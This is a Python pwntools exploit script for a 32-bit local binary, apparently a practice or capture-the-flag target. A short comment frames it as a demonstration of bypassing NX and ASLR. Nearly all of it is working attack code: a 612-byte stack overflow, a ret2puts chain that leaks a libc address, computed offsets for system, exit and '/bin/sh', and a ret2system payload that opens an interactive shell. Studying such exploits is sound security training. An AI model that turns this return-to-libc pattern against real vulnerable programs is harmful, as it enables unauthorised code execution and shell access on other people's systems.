#!/usr/bin/python

# arch: 32 bit
# protections: NX, ASLR
# vuln type / strategy: stack-based overflow - leaking gets address through ret2puts and dinamically calculating libc base address, then performing ret2system to execute /bin/sh - since this is a 32bit version of the vulnerable binary and exploitation is conducted locally, we can potentially bypass aslr by brute-forcing the libc base address with a while loop in bash and avoiding ret2puts. This exploit aims to showcase how to perform ret2puts and make dinamic calculation of libc address though.

# offset: 612

from pwn import *

r = process('./alca')

def get_leak():

    puts_plt = (0x8049050)
    ret_vuln = (0x80491c9)
    gets_got = (0x804c00c)

    payload = "A"*612
    payload += p32(puts_plt)
    payload += p32(ret_vuln)
    payload += p32(gets_got)

    r.sendline(payload)
    r.recvline()

    leak = u32(r.recvline()[:4])
    log.info('gets@libc leaked: {}'.format(hex(leak)))

    return leak

#----------------------------------------------------#

def main():

    libc_base = (get_leak() - 0x6e9c0)
    system = (libc_base + 0x44cc0)
    _exit = (libc_base + 0x37640)
    arg_sh = (libc_base + 0x18fb62)

    log.info("libc_base address: {}".format(hex(libc_base)))
    log.info("system@libc: {}".format(hex(system)))
    log.info("exit@libc: {}".format(hex(_exit)))
    log.info("/bin/sh at: {}".format(hex(arg_sh)))

    sendme = "A"*612
    sendme += p32(system)
    sendme += p32(_exit)
    sendme += p32(arg_sh)

    r.sendline(sendme)
    r.interactive()

if __name__ == "__main__":
    main()
